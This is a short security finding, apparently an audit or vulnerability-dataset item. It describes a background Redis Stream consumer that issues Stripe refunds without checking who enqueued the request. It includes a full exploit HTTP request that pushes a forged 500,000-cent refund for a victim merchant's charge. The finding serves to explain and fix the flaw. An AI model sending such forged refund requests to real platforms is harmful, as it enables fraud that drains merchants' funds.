diagnosis: The background Redis Stream consumer group processor reads refund requests enqueued by client-facing events and issues Stripe financial refunds based solely on the stream payload parameters (chargeId and amountCents). Because the consumer executes the refund without verifying that the user who enqueued the event is the merchant owner of targetAccountId or has refund manager rights, an attacker can trigger fraudulent refunds to drain merchant bank accounts.
exploit_request:
POST /api/queue/stream-push HTTP/1.1
Host: api.saasplatform.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"stream": "payments:refunds", "payload": {"chargeId": "ch_victim_merchant_99182", "amountCents": "500000", "targetAccountId": "acct_competitor_8812"}}
